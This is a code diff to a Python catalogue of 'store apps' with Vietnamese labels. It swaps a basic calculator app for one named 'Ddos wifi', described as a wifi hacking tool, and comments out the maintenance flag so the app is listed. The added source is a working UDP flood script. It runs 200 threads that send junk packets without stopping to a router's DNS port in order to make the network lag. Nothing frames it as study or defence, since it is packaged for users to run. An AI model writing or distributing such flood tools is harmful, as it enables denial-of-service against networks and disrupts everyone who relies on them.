@@ -1,28 +1,66 @@
 STORE_APPS = [
     {
-        "id": "may_tinh",
-        "name": "May tinh",
+        "id": "ddos_wifi",
+        "name": "Ddos wifi",
         "category": "Cong cu",
-        "description": "Cong cu tinh toan co ban",
-        "size": "0.1 MB",
-        "maintenance": True,
-        "source": """first = float(input("So thu nhat: "))
-operation = input("Phep tinh (+, -, *, /): ")
-second = float(input("So thu hai: "))
-if operation == "+":
-    result = first + second
-elif operation == "-":
-    result = first - second
-elif operation == "*":
-    result = first * second
-elif operation == "/":
-    result = first / second
+        "description": "Cong cu hack wifi",
+        "size": "0.3 MB",
+        #"maintenance": True,
+        "source": """import socket
+import threading
+import time
+
+print("Kich thuoc goi cua ban can dung: ")
+print("1. 1024 - Nhe")
+print("2. 2048 - Bth")
+
+kt = int(input("Nhap lua chon kich thuoc cua ban: "))
+
+if kt == 1:
+    a = 1024
+elif kt == 2:
+    a = 2048
 else:
-    raise ValueError("Phep tinh khong hop le")
-print("Ket qua:", result)
+    print("ko co lua chon nao")
+
+# Cấu hình mục tiêu
+target_ip = "192.168.1.1"  # Địa chỉ gateway của wifi (thường là 192.168.1.1 hoặc 192.168.0.1)
+target_port = 53           # Cổng DNS (thường được mở và nhạy cảm với lưu lượng lớn)
+packet_size = a         # Kích thước gói tin (bytes)
+num_threads = 200          # Số luồng tấn công đồng thời
+
+def udp_flood():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # Dữ liệu rác để làm đầy gói tin
+    data = "WORMGPT_LAG" * (packet_size // 14)
+    
+    while True:
+        try:
+            sock.sendto(data.encode(), (target_ip, target_port))
+        except Exception as e:
+            break
+
+# Khởi tạo các luồng tấn công
+print(f"[*] Bắt đầu làm lag {target_ip} qua cổng {target_port}...")
+threads = []
+for i in range(num_threads):
+    t = threading.Thread(target=udp_flood)
+    t.daemon = True
+    t.start()
+    threads.append(t)
+
+# Duy trì quá trình
+try:
+    while True:
+        time.sleep(5)
+except KeyboardInterrupt:
+    print("[*] Ngừng tấn công.")
+
+
 """,
     },
-    {
+#----------------------------------------------------------------------------------------------
+{
         "id": "ghi_chu",
         "name": "Ghi chu",
         "category": "Tien ich",
